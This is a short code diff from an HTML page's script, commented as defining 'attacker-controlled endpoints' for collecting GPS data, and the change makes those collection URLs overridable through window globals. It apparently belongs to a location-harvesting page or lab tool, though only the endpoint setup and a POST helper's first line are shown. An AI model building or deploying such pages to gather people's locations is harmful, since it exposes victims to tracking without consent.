@@ -49,8 +49,8 @@
 
     <script>
         // Attacker-controlled endpoints
-        const ENDPOINT_GPS = '/collect';
-        const ENDPOINT_FALLBACK = '/collect-fallback';
+        const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
+        const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');
 
         // Helper to send POST data as JSON
         async function postJSON(url, data) {
